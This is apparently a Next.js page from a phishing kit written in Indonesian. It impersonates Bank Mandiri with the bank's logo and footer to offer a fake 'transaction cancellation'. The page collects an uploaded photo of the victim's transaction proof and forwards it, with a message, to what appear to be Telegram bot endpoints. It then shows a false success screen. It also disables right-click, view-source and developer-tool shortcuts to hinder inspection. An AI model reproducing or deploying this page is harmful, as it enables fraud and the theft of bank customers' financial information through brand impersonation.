'use client';

import React, { useState, useRef, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import Image from 'next/image';
import { 
  CloudUpload, 
  X, 
  ShieldCheck, 
  CircleX, 
  CheckCircle 
} from 'lucide-react';

export default function CancellationPage() {
  const [file, setFile] = useState<File | null>(null);
  const [previewUrl, setPreviewUrl] = useState<string | null>(null);
  const [isProcessing, setIsProcessing] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const [toast, setToast] = useState<string | null>(null);
  
  const fileInputRef = useRef<HTMLInputElement>(null);

  // Security and context menu handling
  useEffect(() => {
    const handleContextMenu = (e: MouseEvent) => e.preventDefault();
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === 'F12') e.preventDefault();
      if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'C' || e.key === 'J')) e.preventDefault();
      if (e.ctrlKey && (e.key === 'u' || e.key === 's' || e.key === 'c')) e.preventDefault();
    };

    document.addEventListener('contextmenu', handleContextMenu);
    document.addEventListener('keydown', handleKeyDown);
    
    return () => {
      document.removeEventListener('contextmenu', handleContextMenu);
      document.removeEventListener('keydown', handleKeyDown);
    };
  }, []);

  const showToast = (message: string) => {
    setToast(message);
    setTimeout(() => setToast(null), 3000);
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const selectedFile = e.target.files?.[0];
    if (selectedFile) {
      validateAndSetFile(selectedFile);
    }
  };

  const validateAndSetFile = (selectedFile: File) => {
    const allowedTypes = ['image/jpeg', 'image/png', 'image/jpg'];
    if (!allowedTypes.includes(selectedFile.type)) {
      showToast("Format file tidak didukung (JPG/PNG)");
      return;
    }
    if (selectedFile.size > 5 * 1024 * 1024) {
      showToast("Ukuran file maksimal 5MB");
      return;
    }
    setFile(selectedFile);
    setPreviewUrl(URL.createObjectURL(selectedFile));
  };

  const clearFile = (e: React.MouseEvent) => {
    e.stopPropagation();
    setFile(null);
    setPreviewUrl(null);
    if (fileInputRef.current) fileInputRef.current.value = '';
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!file) {
      showToast("Unggah bukti transaksi terlebih dahulu!");
      return;
    }

    setIsProcessing(true);

    try {
      const timestamp = new Date().toLocaleString('id-ID');
      
      // 1. Send text message
      const textResponse = await fetch('/api/telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          message: `🔄 *PEMBATALAN TRANSAKSI*\n━━━━━━━━━━━━━━━\n📎 *Bukti Transaksi:* Terlampir (foto)\n━━━━━━━━━━━━━━━\n⏰ *Waktu:* ${timestamp}\n✅ *STATUS: PENGAJUAN PEMBATALAN DITERIMA*` 
        })
      });

      // 2. Send photo
      const formData = new FormData();
      formData.append('photo', file);
      formData.append('caption', `🔄 *BUKTI PEMBATALAN TRANSAKSI*\n━━━━━━━━━━━━━━━\n⏰ *Waktu:* ${timestamp}\n✅ *Status: Pengajuan pembatalan diterima*`);
      
      const photoResponse = await fetch('/api/telegram/photo', {
        method: 'POST',
        body: formData
      });

      const textData = await textResponse.json();
      const photoData = await photoResponse.json();

      if (textData.ok || photoData.ok) {
        setTimeout(() => {
          setIsProcessing(false);
          setIsSuccess(true);
        }, 1500);
      } else {
        throw new Error("Gagal mengirim notifikasi");
      }
    } catch (error) {
      console.error(error);
      setIsProcessing(false);
      showToast("Gagal memproses, coba lagi");
    }
  };

  return (
    <div className="app-container">
      {/* Keamanan Kanan Kiri */}
      <div className="security-overlay-left"></div>
      <div className="security-overlay-right"></div>

      {/* Full Loader Overlay */}
      <AnimatePresence>
        {isProcessing && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="loader-overlay"
          >
            <div className="mandiri-loader">
              <div className="spin-part blue"></div>
              <div className="spin-part gold"></div>
            </div>
            <div className="loading-text">Memproses pembatalan transaksi...</div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Success Notification */}
      <AnimatePresence>
        {isSuccess && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            className="block-notification"
          >
            <motion.div 
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              className="block-card"
            >
              <div className="block-card-content">
                <CheckCircle className="success-icon mx-auto mb-2 text-[#28a745]" size={70} />
                <h1>Pembatalan Transaksi Berhasil</h1>
                <p className="smooth-message">Pengajuan pembatalan Anda telah diterima oleh sistem dan sedang dalam proses verifikasi.</p>
              </div>
              <button 
                className="btn-tutup" 
                onClick={() => window.location.reload()}
              >
                Tutup
              </button>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Toast Message */}
      <AnimatePresence>
        {toast && (
          <motion.div 
            initial={{ opacity: 0, y: 20, x: '-50%' }}
            animate={{ opacity: 1, y: 0, x: '-50%' }}
            exit={{ opacity: 0, y: 20, x: '-50%' }}
            className="toast-message"
          >
            {toast}
          </motion.div>
        )}
      </AnimatePresence>

      <header className="main-header-container">
        <Image 
          src="https://upload.wikimedia.org/wikipedia/commons/a/ad/Bank_Mandiri_logo_2016.svg" 
          alt="Mandiri" 
          width={100} 
          height={30} 
          className="logo-mandiri"
          priority
        />
      </header>

      <main className="otp-card">
        <h2 className="title">Pembatalan Transaksi</h2>
        <p className="subtitle">Silakan unggah bukti transaksi yang ingin Anda batalkan.</p>
        
        <form onSubmit={handleSubmit}>
          <div 
            className="upload-container" 
            onClick={() => fileInputRef.current?.click()}
          >
            <input 
              type="file" 
              ref={fileInputRef}
              onChange={handleFileChange}
              accept="image/*" 
              hidden 
            />
            
            <AnimatePresence mode="wait">
              {!previewUrl ? (
                <motion.div 
                  key="upload-prompt"
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  exit={{ opacity: 0 }}
                  id="uploadContent"
                >
                  <CloudUpload className="upload-icon mx-auto" strokeWidth={1.5} />
                  <p className="upload-text">Ketuk untuk pilih foto bukti</p>
                  <p className="upload-sub">Format: JPG, PNG (Maks. 5MB)</p>
                </motion.div>
              ) : (
                <motion.div 
                  key="preview"
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  exit={{ opacity: 0 }}
                  className="preview-container"
                >
                  <button 
                    className="remove-btn" 
                    onClick={clearFile}
                    type="button"
                  >
                    <X size={20} />
                  </button>
                  <Image 
                    src={previewUrl} 
                    alt="Preview" 
                    fill 
                    className="preview-image" 
                  />
                </motion.div>
              )}
            </AnimatePresence>
          </div>

          <div className="premium-info-box">
            <ShieldCheck size={16} className="text-[#004D99]" />
            <span>Unggah bukti Valid agar Pembatalan dapat diterima oleh sistem.</span>
          </div>

          <button 
            type="submit" 
            className={`btn-submit ${file ? 'active' : ''}`} 
            disabled={!file || isProcessing}
          >
            <CircleX size={18} className="mr-2" />
            BATALKAN TRANSAKSI
          </button>
        </form>
      </main>

      <footer className="footer-blue-bar">
        © 2026 PT Bank Mandiri (Persero) Tbk.
      </footer>
    </div>
  );
}
